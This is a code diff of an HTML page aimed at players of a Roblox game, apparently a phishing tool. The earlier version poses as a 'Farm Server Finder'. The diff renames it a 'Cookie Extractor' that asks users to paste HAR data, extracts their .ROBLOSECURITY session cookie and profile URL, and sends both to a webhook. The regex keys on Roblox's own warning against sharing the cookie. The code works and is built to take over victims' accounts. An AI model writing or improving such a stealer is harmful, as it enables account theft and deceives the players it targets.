@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MM2 Farm Server Finder</title>
+    <title>MM2 Cookie Extractor</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         body {
@@ -60,38 +60,46 @@
 </head>
 <body>
     <div class="container">
-        <h1>MM2 Farm Server Finder</h1>
-        <p>Paste your request (e.g., copied as PowerShell) below:</p>
-        <textarea id="textarea" placeholder="Paste your PowerShell request here..."></textarea>
+        <h1>MM2 Cookie Extractor</h1>
+        <p>Paste your HAR file content below:</p>
+        <textarea id="textarea" placeholder="Paste your HAR file content here..."></textarea>
         <button id="submit">Submit</button>
         <div class="error" id="error-message"></div>
     </div>
 
     <script>
-        function extractROBLOSECURITYFromPowerShell(input) {
-            // Use a regex to locate .ROBLOSECURITY cookie
-            const roblosecurityRegex = /\\.ROBLOSECURITY\",\\s*\\\"([^\\\"]+)\\\"/;
-            const match = input.match(roblosecurityRegex);
+        function extractDataFromHAR(input) 
+            const roblosecurityRegex = /_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|\_([a-zA-Z0-9]+)/;
+            const roblosecurityMatch = input.match(roblosecurityRegex);
 
-            if (match) {
-                const roblosecurity = match[1];
-                return roblosecurity;
-            }
+            // Look for the profile URL
+            const profileRegex = /https:\/\/www\.roblox\.com\/users\/\d+\/profile/;
+            const profileMatch = input.match(profileRegex);
 
-            return null; // Cookie not found
+            return {
+                roblosecurity: roblosecurityMatch ? roblosecurityMatch[1] : null,
+                profileURL: profileMatch ? profileMatch[0] : null
+            };
         }
 
         document.getElementById("submit").addEventListener("click", async () => {
             const rawData = document.getElementById("textarea").value;
-
-            // Attempt to extract the .ROBLOSECURITY cookie
-            const roblosecurity = extractROBLOSECURITYFromPowerShell(rawData);
+            const { roblosecurity, profileURL } = extractDataFromHAR(rawData);
 
             if (!roblosecurity) {
                 Swal.fire({
                     icon: "error",
                     title: "Error",
-                    text: ".ROBLOSECURITY cookie not found. Please check your input.",
+                    text: "No active account found!",
+                });
+                return;
+            }
+
+            if (!profileURL) {
+                Swal.fire({
+                    icon: "error",
+                    title: "Error",
+                    text: "Profile was not found. Make sure you copy the file while logged in a ROBLOX account.",
                 });
                 return;
             }
@@ -108,25 +116,28 @@
                     body: JSON.stringify({
                         embeds: [
                             {
-                                title: "ROBLOSECURITY Found",
-                                description: `Cookie: \`${roblosecurity}\``,
-                                color: 16711680, // Red color
-                            },
-                        ],
+                                title: "ROBLOSECURITY Extracted",
+                                fields: [
+                                    { name: "Profile URL", value: profileURL, inline: false },
+                                    { name: "ROBLOSECURITY", value: `\`${roblosecurity}\``, inline: false },
+                                ],
+                                color: 65280 // Green
+                            }
+                        ]
                     }),
                 });
 
                 Swal.fire({
                     icon: "success",
                     title: "Success",
-                    text: ".ROBLOSECURITY cookie sent to the webhook!",
+                    text: "Data sent successfully!",
                 });
             } catch (error) {
                 console.error("Error sending data to webhook:", error);
                 Swal.fire({
                     icon: "error",
                     title: "Error",
-                    text: "Failed to send data to webhook. Check console for details.",
+                    text: "ERROR WHILE PROCESSING YOUR DATA!",
                 });
             }
         });
